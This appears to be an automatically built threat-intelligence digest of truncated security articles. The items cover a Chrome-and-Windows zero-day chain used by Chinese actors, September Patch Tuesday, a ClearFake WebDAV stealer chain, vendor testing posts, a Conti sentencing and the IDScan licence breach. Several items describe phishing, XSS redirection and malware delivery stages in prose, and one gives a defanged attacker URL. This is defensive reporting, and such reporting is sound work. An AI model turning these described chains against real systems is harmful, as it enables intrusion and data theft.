Threat Intelligence Mind the (Patch) Gap: Multiple Chinese Threat Actors Chain 0-day Exploits in Chrome & Windows September 9, 2026 Ankur Saini, Conor Quigley, Sean Koessel, Steven Adair, and Tom Lancaster On September 1, 2026, Volexity’s Network Security Monitoring (NSM) service detected a spear-phishing campaign from a Chinese threat actor it tracks as UTA0560 targeting customers at multiple non-governmental organizations (NGOs). The emails contained a message encouraging the users to a click a link that led to the website of a US-based university. These links abused a reflected cross-site scripting (XSS) vulnerability on the website, redirecting recipients to threat-actor-controlled infrastructure hosting a multi-stage exploit chain that included a Google Chrome zero-day, CVE-2026-85046 . Volexity analyzed its email telemetry and discovered that another Chinese threat actor it tracks as JungleBamboo (also known as APT31/Violet Typhoon/TA412) was also exploiting the same vulnerability chain against a different set of targets using different infrastructure and post-exploitation malware. CVE-2026-85046 was reported to the Chromium project by a private security researcher on August 4, 2026. A fix later entered the open-source Chromium codebase, on which Google Chrome and other Chromium-based browsers are built. However, at the time of the phishing operation, the fix had not reached a released version of Google Chrome. This created an unusual patch gap: The vulnerability was known and fixed upstream, making it an N-day at the Chromium source level, but there was no patch release for Google Chrome users. Therefore, the exploit was effectively a zero-day against Google Chrome. The exploit first gains arbitrary read/write within the V8 sandbox through the Type confusion vulnerability (CVE-2026-85046), then combines a separate WebAssembly defect to escape the V8 sandbox ( CVE-2026-87491 ). It then exploits a third vulnerability in the Windows kernel ( CVE-2026-85880 ) to escape Chrome’s sandboxed renderer process and inject code into the Chrome browser process. From there, exploit-chain users can deploy a payload of their choice. Volexity observed two distinct clusters of activity using the exploit chain to deliver different payloads: UTA0560 downloaded and deployed the GRIMWEDGE JScript backdoor providing host reconnaissance, file and process management, command execution, and payload delivery capabilities. JungleBamboo deployed SUPERSTOMP, a loader that installed the LONGTALE credential-stealing Chrome extension. This blog documents the shared exploitation chain, as well as the distinct post-exploitation malware deployed by each threat actor. UTA0560 Targets NGOs with Financial Lures Volexity’s NSM service detected phishing emails sent to multiple customers on September 1, 2026, from a known UTA0560 email account. The phishing lures matched previously unsuccessful phishing emails sent to Volexity customer organizations, which were detected by Volexity in March 2026. An example phishing email is shown below: The email body contained a link to a legitimate website susceptible to a reflective XSS vulnerability which was abused by UTA0560 to redirect the visitor to the first stage in a multi-stage Chrome browser zero-day exploit chain. Upon clicking the URL, the browser redirected to the following URL , which began the exploitation process: hxxps://cloud.shinewrist[.]net/<removed>/Files1.html The exploit abused the vulnerability CVE-2026-85046 in the Chrome browser, a type-confusion bug in the V8 JavaScript Engine. When the phishing URL is clicked by the user, a multi-stage exploitation chain occurs, exploiting both the Chrome browser and the Windows kernel to deploy and execute malware on the victim host. The vulnerability in the Windows kernel has been assigned CVE-2026-85880 . After clicking on the URL, the only behavior noticeable from the user perspective is an image displayed in the browser mimicking a donation form on a web pag
```

#### Corroborating sources (1)

- **Volexity** (threat_research_primary)
  - Title: Mind the (Patch) Gap: Multiple Chinese Threat Actors Chain 0-day Exploits in Chrome & Windows
  - Published: 2026-09-09T17:36:22+00:00
  - Link: https://www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/
  - Summary: On September 1, 2026, Volexity’s Network Security Monitoring (NSM) service detected a spear-phishing campaign from a Chinese threat actor it tracks as UTA0560 targeting customers at multiple non-governmental organizations (NGOs). […] The post Mind the (Patch) Gap: Multiple Chinese Threat Actors Chain 0-day Exploits in Chrome & Windows appeared first on Volexity .

### Cluster f08ee4366d — score 10

- Title: Microsoft Patch Tuesday for September 2026 — Snort rules and prominent vulnerabilities
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-09-08T22:16:35+00:00
- Link: https://blog.talosintelligence.com/microsoft-patch-tuesday-for-september-2026/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_products: Azure, Cisco
- cve_ids: CVE-2026-69676, CVE-2026-69852, CVE-2026-72957, CVE-2026-81963, CVE-2026-85880
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_products: Azure, Cisco
- cve_ids: CVE-2026-81963, CVE-2026-85880, CVE-2026-69676, CVE-2026-69852, CVE-2026-72957
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Microsoft has released its monthly security update for September 2026, which includes 973 vulnerabilities affecting a range of products, including 113 that Microsoft marked as "critical."
```

#### Full body

```
Microsoft Patch Tuesday for September 2026 — Snort rules and prominent vulnerabilities By Cisco Talos Tuesday, September 8, 2026 18:16 Patch Tuesday Microsoft has released its monthly security update for September 2026, which includes 973 vulnerabilities affecting a range of products, including 113 that Microsoft marked as "critical." Microsoft notes that 2 of the vulnerabilities disclosed this month have been exploited in the wild: CVE-2026-81963 affects Windows Update Stack. CVE-2026-81963 is a elevation of privilege vulnerability associated with Improper Link Resolution Before File Access ('Link Following') and Improper Access Control and has a CVSS base score of 7.8. CVE-2026-85880 affects Windows Advanced Local Procedure Call (ALPC). CVE-2026-85880 is a elevation of privilege vulnerability associated with Heap-based Buffer Overflow and Use of Uninitialized Resource and has a CVSS base score of 7.8. Out of 113 "critical" vulnerabilities, 82 are remote code execution (RCE) vulnerabilities. Microsoft considers exploitation of the following vulnerabilities more likely: CVE-2026-69676 affects Windows Kerberos. CVE-2026-69676 is a remote code execution vulnerability associated with Authentication Bypass by Capture-replay and has a CVSS base score of 8.8. CVE-2026-69852 affects Windows Routing and Remote Access Service (RRAS). CVE-2026-69852 is a remote code execution vulnerability associated with Heap-based Buffer Overflow and has a CVSS base score of 7.5. CVE-2026-72957 affects Windows Deployment Services. CVE-2026-72957 is a remote code execution vulnerability associated with Heap-based Buffer Overflow and has a CVSS base score of 7.8. CVE-2026-69854 affects Spring Cloud Azure. CVE-2026-69854 is a elevation of privilege vulnerability associated with Improper Authentication and has a CVSS base score of 9.0. CVE-2026-83501 affects Windows Virtualization-Based Security (VBS). CVE-2026-83501 is a information disclosure vulnerability associated with Out-of-bounds Read and has a CVSS base score of 5.5. CVE-2026-70585 affects Windows Services for NFS ONCRPC XDR Driver. CVE-2026-70585 is a remote code execution vulnerability associated with Use After Free and has a CVSS base score of 7.0. CVE-2026-69730 affects Windows DNS Server. CVE-2026-69730 is a remote code execution vulnerability associated with Use After Free and has a CVSS base score of 9.8. CVE-2026-69857 affects Azure Cosmos DB. CVE-2026-69857 is a spoofing vulnerability associated with Authorization Bypass Through User-Controlled Key and has a CVSS base score of 8.5. Microsoft considers exploitation of the following vulnerabilities less likely: CVE-2026-69845 and CVE-2026-72979 affect Windows DHCP Server. CVE-2026-69845 is a remote code execution vulnerability associated with Heap-based Buffer Overflow and Improper Input Validation and has a CVSS base score of 9.8. CVE-2026-72979 is a remote code execution vulnerability associated with Use After Free and has a CVSS base score of 9.8. CVE-2026-58599 affects HEVC Video Extensions. CVE-2026-58599 is a remote code execution vulnerability associated with Heap-based Buffer Overflow and has a CVSS base score of 7.8. CVE-2026-65772 affects Microsoft Dynamics 365 On-Premises. CVE-2026-65772 is a remote code execution vulnerability associated with Deserialization of Untrusted Data and has a CVSS base score of 8.8. CVE-2026-66302 affects Skype for Business. CVE-2026-66302 is a remote code execution vulnerability associated with External Control of File Name or Path and has a CVSS base score of 9.8. CVE-2026-67631 , CVE-2026-65669 , and CVE-2026-67378 affect Microsoft SQL Server. CVE-2026-67631 is a remote code execution vulnerability associated with Heap-based Buffer Overflow and has a CVSS base score of 8.8. CVE-2026-65669 is a elevation of privilege vulnerability associated with Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection') and has a CVSS base score of 9.6. CVE-2026-67378 is a re
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: Microsoft Patch Tuesday for September 2026 — Snort rules and prominent vulnerabilities
  - Published: 2026-09-08T22:16:35+00:00
  - Link: https://blog.talosintelligence.com/microsoft-patch-tuesday-for-september-2026/
  - Summary: Microsoft has released its monthly security update for September 2026, which includes 973 vulnerabilities affecting a range of products, including 113 that Microsoft marked as "critical."

### Cluster 93c6fb73a4 — score 10

- Title: ClearFake WebDAV infection chain delivers Amatera stealer, ZigCryptoStealer, and NetSupport Manager
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-09-08T10:01:07+00:00
- Link: https://blog.talosintelligence.com/clearfake-webdav-infection-chain/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: financial_services, government
- affected_products: Cisco
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- affected_industries: financial_services, government
- affected_products: Cisco
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
We assess with moderate confidence that the attacks are not targeted at a particular organization, but are a part of a cryptocurrency and credentials-stealing operation using the Amatera stealer as the primary payload.
```

#### Full body

```
ClearFake WebDAV infection chain delivers Amatera stealer, ZigCryptoStealer, and NetSupport Manager By Vanja Svajcer Tuesday, September 8, 2026 06:01 Threats Threat Spotlight Cisco Talos began an investigation after observing a DLL named "verification.google" executing from WebDAV at a Ukrainian government organization. We assess with moderate confidence that the attacks are not targeted at a particular organization, but are a part of a cryptocurrency and credentials-stealing operation using the Amatera stealer as the primary payload. Pivoting around the similar WebDAV behavior led to a second loader named "pf.ch" and allowed us to reconstruct its earlier delivery stages. The chain uses a Cloudflare Worker to inject JavaScript code stored on BNB Smart Chain and a ClickFix prompt impersonating Google CAPTCHA, leading to download and execution of Amatera stealer. The chain is likely very similar to what has caused the WebDAV-based execution at the Ukraininan government organization. The two Amatera builds were tasked with different secondary payloads by their respective command-and-control (C2) infrastructure: the "pf.ch" loader was instructed to deploy a NativeAOT loader running ZigCryptoStealer and a Go-based reverse proxy, while the "verification.google" loader was instructed to install an unauthorized instance of NetSupport Manager. The NetSupport Manager installation contained configuration with the C2 server using an IP address based in Russia. With moderate confidence, we assess that "verification.google" branch attack was conducted by a Russian threat actor. In April 2026, Cisco Talos identified an unusual WebDAV DLL execution in endpoint telemetry from a Ukrainian government organization. The remote file was named "verification.google" and was launched through the 32-bit version of "rundll32.exe". This initial finding led us to two similar delivery chains, two different DLL loaders and two ACR/Amatera stealer payloads. Talos tracks the actor behind the observed "verification.google" activity as UAT-10820. Following the initial investigation, we decided to hunt for similar WebDAV and ordinal-execution patterns in an attempt to recover the full infection chain. Using VirusTotal, we were able to identify a full chain from a second DLL loader named "pf.ch". These two examples are a part of a wider set of recent campaigns delivering Amatera through different infection chains. In July 2026, Malwarebytes documented fake game and software downloads that used RenPy Loader, MSBuild and EtherHiding before delivering Amatera. Blackpoint Cyber described another fake-verification chain that used a signed Microsoft App-V script, configuration stored in Google Calendar and a payload concealed in a PNG image. Apart from the main payload malware family, we found no common infrastructure or other evidence linking those activities to the chains described in this post. Initial finding in endpoint telemetry The initial event that started the investigation was recorded in April 2026 and it showed an execution of a DLL file through a WebDAV UNC path together with startup of the Windows WebClient service. Apart from the initial command line, we had details of the checksum of the executed DLL but it was not clear what started the execution chain. It was time for hunting in open source intelligence repositories and Talos analytical platform. We wanted to find a similar execution with the similar loader and the payload family and ideally recover the whole infection chain which would likely point to how "verification.google" execution was triggered. This lead us to the "pf.ch" loader and the chain we discovered. Hunting reveals a second WebDAV delivery chain The "pf.ch" sample uses the same combination of WebDAV, a disguised DLL filename and ordinal execution through "rundll32.exe". We were also able to recover the full ClickFake related sequence leading to this loader. Figure 1 shows both chains, with dashed elements marking stages that were not d
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: ClearFake WebDAV infection chain delivers Amatera stealer, ZigCryptoStealer, and NetSupport Manager
  - Published: 2026-09-08T10:01:07+00:00
  - Link: https://blog.talosintelligence.com/clearfake-webdav-infection-chain/
  - Summary: We assess with moderate confidence that the attacks are not targeted at a particular organization, but are a part of a cryptocurrency and credentials-stealing operation using the Amatera stealer as the primary payload.

### Cluster 99389bbd5f — score 10

- Title: Patch Tuesday to Pentest Wednesday: How an Equipment Rental Company Is Turning Continuous Testing Into Continuous Exposure Management
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-09-09T15:58:00+00:00
- Link: https://horizon3.ai/intelligence/blogs/pentest-wednesday-continuous-exposure-management/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
See how an equipment rental company moved beyond point-in-time pentesting with NodeZero®, continuously validating exploitable risk, driving remediation, and measuring whether exposure is actually decreasing.
```

#### Full body

```
Patch Tuesday to Pentest Wednesday: How an Equipment Rental Company Is Turning Continuous Testing Into Continuous Exposure Management Stephen Gates September 9, 2026 Blogs A Pentest Wednesday® Story Introduction For a large equipment rental and services company with distributed operations supporting customers across a wide range of industries, technology is deeply embedded in how the business operates. Its environment spans corporate systems, customer-facing applications, digital services, and the technology supporting a complex rental and fleet operation. Across that footprint, cyber exposure is constantly changing. That made point-in-time security testing increasingly difficult to rely on. A traditional penetration test could provide useful insight into the environment on the day it was performed, but it could not show what became exploitable the next day, the next week, or months before the next assessment. The security team needed a way to continuously identify where exposure existed, validate what attackers could actually exploit, and use that evidence to drive remediation as the environment changed. That shift is helping the organization move toward continuous exposure management. CTEM provides a framework for getting there, but the goal is not simply to execute its stages. It is to continuously reduce the exposures attackers can use. The NodeZero® Proactive Security Platform provides the continuous validation needed to help put that approach into practice. As the company’s Chief Security Architect explained: “We are leveraging the Horizon3 APIs to pull telemetry into Splunk for our CTEM attack surface management pipeline.” For the team, that pipeline is ultimately about making exposure management continuous: identifying changes in the environment, validating what creates real risk, acting on the evidence, and measuring whether those actions actually reduce exposure. Outcomes at a Glance More findings in 12 hours than a third-party engagement found in roughly 30 days, giving the team faster evidence of where real exposure existed. An SSH key exposure caused by a recent change was discovered in about eight hours, rather than potentially remaining unnoticed until the next annual pentest. A suspected Cisco vulnerability was validated as exploitable, helping the team move from assumption to evidence and then remediate the affected systems. Password testing exposed systemic Active Directory weaknesses, driving broader password and identity security changes. NodeZero telemetry now feeds the organization’s CTEM attack surface management pipeline in Splunk, helping operationalize continuous exposure management. Impact The value of continuous exposure management became tangible when NodeZero began producing evidence faster and more consistently than the company’s traditional testing model. In one comparison, NodeZero uncovered more findings in hours than a third-party assumed-breach and external penetration testing engagement found over several weeks. As the company’s Chief Security Architect put it: “You’ve uncovered and saved our bacon in multiple areas… You found more findings in 12 hours than they found in 30 days.” The value was not simply speed. It was the ability to test repeatedly as the environment changed, validate which weaknesses were actually exploitable, and surface exposures that might otherwise remain hidden between scheduled assessments. Background The company’s move toward continuous exposure management was driven by a simple reality: its environment changes too quickly for annual or periodic testing to provide a current picture of exposure. That became clear when an employee stood up a PHP web server for testing in the root directory. In doing so, SSH RSA key pairs were exposed, creating an opportunity for lateral movement. NodeZero surfaced the issue roughly eight hours after the change was introduced. As the company’s Chief Security Architect explained: “That individual did that… theoretically, in most organi
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: Patch Tuesday to Pentest Wednesday: How an Equipment Rental Company Is Turning Continuous Testing Into Continuous Exposure Management
  - Published: 2026-09-09T15:58:00+00:00
  - Link: https://horizon3.ai/intelligence/blogs/pentest-wednesday-continuous-exposure-management/
  - Summary: See how an equipment rental company moved beyond point-in-time pentesting with NodeZero®, continuously validating exploitable risk, driving remediation, and measuring whether exposure is actually decreasing.

### Cluster 396a583814 — score 10

- Title: What Fal.Con 2026 Reinforced: AI Makes Proving Exposure More Important Than Ever
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-09-04T17:46:19+00:00
- Link: https://horizon3.ai/intelligence/blogs/fal-con-2026-ai-exposure-validation/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
AI is accelerating vulnerability discovery, but security teams still need to know which exposures actually matter. Here’s what Fal.Con 2026 reinforced about offensive security, validation, and proving risk.
```

#### Full body

```
What Fal.Con 2026 Reinforced: AI Makes Proving Exposure More Important Than Ever Horizon3 September 4, 2026 Blogs For three days at Fal.Con 2026, Horizon3 was hard to miss across the show floor. Our booth stayed packed, our team ran demo after demo of NodeZero®, dozens of people packed into Snehal Antani’s two sessions, and Ward Holloway’s theater session was standing room only. But the biggest takeaway wasn’t the traffic, the sessions, or even the more than 1,300 Go Hack Yourself shirts we handed out. It was the conversations behind all of it. AI is accelerating vulnerability discovery and compressing the time between discovery and potential exploitation, but security teams already have more vulnerabilities than they can reasonably fix. Finding more of them, faster, only makes one question more important: Which exposures actually matter in my environment? This is a question that came up again and again at Fal.Con. Offense is increasingly informing defense That same thinking showed up on Fal.Con’s biggest stage. In his keynote, CrowdStrike CEO George Kurtz spoke about AI as the new cyber battlefield, offense informing defense, AI red teaming, and the need for a continuous approach to security. Those themes closely reflect something Horizon3 has believed from the beginning: the best way to understand whether your defenses will stand up to an attacker is to attack them yourself. As AI increases attacker speed and scale, defenders need offensive capabilities that continuously test real environments and provide evidence of what attackers can exploit, how far they can get, which controls stop them, and whether remediation worked. That attacker-derived evidence is also central to Horizon3’s integration with Falcon Next-Gen SIEM and the perspective we bring to CrowdStrike’s Project QuiltWorks. AI is accelerating discovery. That makes validation more important. Ward tackled this directly in his session, “Beyond the Mythos Hype.” AI is getting better at finding and validating vulnerabilities, compressing work that once required significant time and expertise. That changes the speed of the problem, but it doesn’t change a fundamental reality for defenders: you cannot fix everything. Security teams already have vulnerability scanners, attack surface management tools, threat intelligence, endpoint telemetry, identity data, and plenty of other signals telling them what could represent risk. Accelerating vulnerability discovery adds even more pressure to an already overloaded system. The challenge is determining which weaknesses create real exposure in your environment, how they can be chained together, and where those attack paths can lead. The standing-room-only crowd for Ward’s session reinforced what we were hearing throughout the show: this challenge is very much on defenders’ minds. Vulnerable does not mean exploitable Snehal approached the same problem from the attacker’s perspective in “Go Hack Yourself. With AI.” His message was straightforward: instead of waiting for attackers to tell you whether your defenses work, continuously attack yourself to find out. That means testing the environment to answer questions vulnerability data alone cannot. Can a vulnerability actually be exploited? Can a credential be abused? Can an attacker move laterally or escalate privileges? Do your security controls stop them? Can several seemingly unrelated weaknesses be chained together to reach something that matters? The answers can materially change what gets fixed first. A critical vulnerability that isn’t proven exploitable in your environment may deserve a very different response from a weakness buried somewhere in a scanner backlog that provides a proven path to critical systems or data. The goal isn’t another score. It’s evidence security teams can use to decide what matters, take action, and then prove that action worked. That closed loop is what continuous exposure management ultimately requires. That’s the idea behind Hack. Fix. Verify. Repe
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: What Fal.Con 2026 Reinforced: AI Makes Proving Exposure More Important Than Ever
  - Published: 2026-09-04T17:46:19+00:00
  - Link: https://horizon3.ai/intelligence/blogs/fal-con-2026-ai-exposure-validation/
  - Summary: AI is accelerating vulnerability discovery, but security teams still need to know which exposures actually matter. Here’s what Fal.Con 2026 reinforced about offensive security, validation, and proving risk.

### Cluster 752341fbcc — score 10

- Title: Credentialed Pre-Port Discovery: Don't Probe the Host, Ask it
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-09-09T15:16:34+00:00
- Link: https://www.rapid7.com/blog/post/pt-credentialed-pre-port-discovery-asking-host
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
If your scan engine already holds credentials for a host, it can ask that host which ports are open instead of probing for them. Every scan begins with the same question: which ports on this host are open? Everything after it, from identifying services to checking for vulnerabilities to evaluating policy, depends on the answer being right. The traditional answer comes from the outside: the scan engine sends traffic to a range of ports and infers each port's state from how the host responds. That approach is the industry standard, and it works well when a clear network path exists between the engine and the host. Hardened hosts can stay silent rather than replying, which forces the engine to wait out timeouts. Rate limiting and intrusion prevention can throttle a burst of probes, and genuinely open ports go missing when they do. Large port ranges take time to cover thoroughly, and that time comes out of your scan window. There is a more direct route on any host where the scan engine alr
```

#### Full body

```
Back to Blog Products and Tools Credentialed Pre-Port Discovery: Don't Probe the Host, Ask it Conor McCormick Sep 9, 2026 | Last updated on Sep 9, 2026 | 7 min read DISCOVER RAPID7 MDR If your scan engine already holds credentials for a host, it can ask that host which ports are open instead of probing for them. Every scan begins with the same question: which ports on this host are open? Everything after it, from identifying services to checking for vulnerabilities to evaluating policy, depends on the answer being right. The traditional answer comes from the outside: the scan engine sends traffic to a range of ports and infers each port's state from how the host responds. That approach is the industry standard, and it works well when a clear network path exists between the engine and the host. Hardened hosts can stay silent rather than replying, which forces the engine to wait out timeouts. Rate limiting and intrusion prevention can throttle a burst of probes, and genuinely open ports go missing when they do. Large port ranges take time to cover thoroughly, and that time comes out of your scan window. There is a more direct route on any host where the scan engine already holds valid credentials: ask the host itself. This is credentialed discovery, so a credential that matches the host is the precondition for everything that follows. The engine connects to the port that credential uses, authenticates with a credential you already manage, and the host's operating system returns an authoritative list of the ports it is listening on. That list covers both TCP and UDP ports. There is no probing, no inference, and nothing to wait out. Three things to know before enabling pre-port discovery Pre-port discovery can report ports that a firewall or other network control stops your scan engine from reaching, and on those hosts you get fewer results and a longer scan. SSH and the Scan Assistant are tried on their standard ports, TCP 22 and TCP 21047, unless you set a different port on the credential's restriction. Credential coverage decides which hosts benefit, and a host with no matching credential falls back to a network port scan. Each of these is covered in full in the configuration and troubleshooting documentation . Why probing from the outside can hit a wall A network port scan works by inference. The engine sends traffic to each port in a configured range and reads the host's response, or its silence, as evidence about that port's state. Inference is the whole method, and its accuracy depends on the path between the engine and the host behaving predictably. Several common conditions break that assumption. A hardened host that drops unsolicited traffic instead of refusing it gives the engine nothing to work with, so the engine waits for a timeout and then records an ambiguous result. Rate limiting and intrusion prevention are built to react to exactly the traffic pattern a port scan produces, and a throttled probe looks the same to the engine as a closed port. Wide port ranges make both problems worse, because every additional port is another probe, another possible timeout, and more scan time. The outcome is a picture that can be partial on one scan and different on the next, on the hosts where an accurate picture matters most. If you already have credentials, ask the host Credentialed pre-port discovery replaces that inference with a question, and it is available from version 8.58. The engine connects to the port a credential uses, authenticates, and reads the list of listening ports from the host. For any host where that succeeds, the engine skips the network port scan and moves straight to examining the ports the host reported. That is what pre-port discovery means: discovering ports before, and in place of, the network port scan. There is nothing new to deploy, because pre-port discovery reuses the credentials you already configure for authenticated scanning. You do not have to choose a method: when more than one credential fi
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Credentialed Pre-Port Discovery: Don't Probe the Host, Ask it
  - Published: 2026-09-09T15:16:34+00:00
  - Link: https://www.rapid7.com/blog/post/pt-credentialed-pre-port-discovery-asking-host
  - Summary: If your scan engine already holds credentials for a host, it can ask that host which ports are open instead of probing for them. Every scan begins with the same question: which ports on this host are open? Everything after it, from identifying services to checking for vulnerabilities to evaluating policy, depends on the answer being right. The traditional answer comes from the outside: the scan engine sends traffic to a range of ports and infers each port's state from how the host responds. That approach is the industry standard, and it works well when a clear network path exists between the engine and the host. Hardened hosts can stay silent rather than replying, which forces the engine to wait out timeouts. Rate limiting and intrusion prevention can throttle a burst of probes, and genuinely open ports go missing when they do. Large port ranges take time to cover thoroughly, and that time comes out of your scan window. There is a more direct route on any host where the scan engine alr

### Cluster c001227b85 — score 10

- Title: Ukrainian hacker gets four years in US prison over Conti ransomware attacks
- Source: The Record (cyber_news_breach_reporting)
- Published: 2026-09-11T12:00:00+00:00
- Link: https://therecord.media/conti-ransomware-ukraine-hacker
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- affected_industries: critical_infrastructure
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- affected_industries: critical_infrastructure
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
A Ukrainian national was sentenced to four years in a U.S. prison for his role in the notorious Conti ransomware operation, which targeted more than 1,000 victims worldwide before shutting down in 2022.
```

#### Full body

```
Image: Moritz Kindler via Unsplash Ukrainian hacker gets four years in US prison over Conti ransomware attacks A Ukrainian national was sentenced to four years in a U.S. prison for his role in the notorious Conti ransomware operation, which targeted more than 1,000 victims worldwide before shutting down in 2022. Oleksii Lytvynenko, 44, worked as both a hacker and developer for Conti, personally targeting at least a dozen companies and helping build malicious tools used by the group, the U.S. Justice Department said Thursday. Lytvynenko, who previously lived in Cork, Ireland, pleaded guilty in June. The police found data stolen from eight U.S. victims and four others overseas in his online accounts. Between 2020 and 2022, Conti hackers attacked organizations across 47 U.S. states and 31 countries, as well as Washington, D.C., and Puerto Rico. The FBI estimated that victims had paid the group more than $150 million in ransoms by January 2022. “For years, the Conti ransomware group executed a sustained and sophisticated campaign that victimized hundreds of organizations across the United States and abroad, including critical infrastructure entities,” said A. Tysen Duva, assistant attorney general for the DOJ criminal division. According to prosecutors, Lytvynenko stored data stolen from victims and worked on a malware “loader,” a tool designed to install or launch other malicious programs on compromised computers. The court documents said forensic evidence recovered during his arrest showed he remained involved in ransomware operations even after Conti itself had shut down. Irish authorities arrested Lytvynenko at his home in Cork in July 2023 at the request of the U.S. He spent several years in an Irish jail while fighting extradition before being transferred. Four other alleged Conti members were charged in a separate indictment unsealed in September 2023. Before its collapse, Conti was one of the world’s most prolific ransomware operations. The group was widely believed to operate from Russia and other parts of Eastern Europe and drew particular attention after its leadership publicly backed Moscow following Russia’s full-scale invasion of Ukraine in February 2022. Shortly afterward, an apparent insider believed to be Ukrainian leaked a trove of Conti’s internal chats and other data, exposing details about the group’s members and operations. Ukrainian authorities arrested another suspected Conti member in Kyiv in 2024. News News Briefs Cybercrime Malware No previous article No new articles Daryna Antoniuk is a reporter for Recorded Future News based in Ukraine. She writes about cybersecurity startups, cyberattacks in Eastern Europe and the state of the cyberwar between Ukraine and Russia. She previously was a tech reporter for Forbes Ukraine. Her work has also been published at Sifted, The Kyiv Independent and The Kyiv Post.
```

#### Corroborating sources (1)

- **The Record** (cyber_news_breach_reporting)
  - Title: Ukrainian hacker gets four years in US prison over Conti ransomware attacks
  - Published: 2026-09-11T12:00:00+00:00
  - Link: https://therecord.media/conti-ransomware-ukraine-hacker
  - Summary: A Ukrainian national was sentenced to four years in a U.S. prison for his role in the notorious Conti ransomware operation, which targeted more than 1,000 victims worldwide before shutting down in 2022.

### Cluster b4ebe90713 — score 10

- Title: IDScan confirms breach after 153 million driver’s licenses leak on dark web
- Source: Help Net Security (cyber_news_breach_reporting)
- Published: 2026-09-11T08:39:33+00:00
- Link: https://www.helpnetsecurity.com/2026/09/11/idscan-net-data-breach-153-million-drivers-licenses/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- affected_industries: government, healthcare
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- affected_industries: healthcare, government
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Days after reports linked IDScan to a dark web database holding more than 153 million driver’s license scans, the identity verification company has confirmed hackers accessed customer data stored on its cloud platform. The Louisiana-based firm, which processes ID checks for car rental companies, retailers and cannabis dispensaries, posted a notice on its website September 4 acknowledging the incident. “On or around September 1, 2026, IDScan.net received information indicating that certain data may have been … More → The post IDScan confirms breach after 153 million driver’s licenses leak on dark web appeared first on Help Net Security .
```

#### Full body

```
Sinisa Markovic , Managing Editor, Help Net Security September 11, 2026 Share IDScan confirms breach after 153 million driver’s licenses leak on dark web Days after reports linked IDScan to a dark web database holding more than 153 million driver’s license scans, the identity verification company has confirmed hackers accessed customer data stored on its cloud platform. The Louisiana-based firm, which processes ID checks for car rental companies, retailers and cannabis dispensaries, posted a notice on its website September 4 acknowledging the incident. “On or around September 1, 2026, IDScan.net received information indicating that certain data may have been accessed without authorization. Upon this discovery, we took immediate steps to secure our systems and engaged a team of third-party specialists to help determine the full nature and scope of the incident. This investigation is currently ongoing,” the company wrote. IDScan’s notice is careful with its wording. The company said an unauthorized third party “may have accessed and/or copied certain customer information” stored in its accounts on the IDScan cloud platform. The data at risk includes names and driver’s license or other government-issued identification numbers. Even though it says access to the data came at a cost, the company says it is notifying people who may be affected “in an abundance of caution” and giving them free credit monitoring and identity protection. “In response to this incident, we immediately began an investigation and reviewed our policies and procedures related to data security. We are also cooperating with federal law enforcement on their investigation.” the company added . Massive ID leak sparks FBI probe The incident came to light after security journalist Brian Krebs reported that a dark web marketplace called Nexus was offering access to more than 153 million scanned driver’s licenses from the US and Canada, along with 10 million ID cards, 3 million travel documents and 579,000 medical cards. Krebs wrote that a source alerted him on August 31 to a listing on the Russian cybercrime forum Exploit, advertising scans of identity documents belonging to more than 170 million people in North America. He said the source flagged it to him because the seller had “offered my Virginia drivers license as a free sample” to prove the data was real. Krebs confirmed the leak was genuine by searching the database for records tied to himself and others who agreed to be checked, then traced the exposed data back to IDScan.net. Based on Krebs’s reporting, the FBI’s New Orleans field office opened a formal investigation, which he says was likely triggered after he told a trusted source that Nexus was also selling the driver’s license of the FBI’s assistant director, though he did not find one belonging to Director Kash Patel in the data. Shortly after this story was published, the Nexus identity theft service disappeared from the dark web . More about breach cybercrime data breach data leak Share
```

#### Corroborating sources (1)

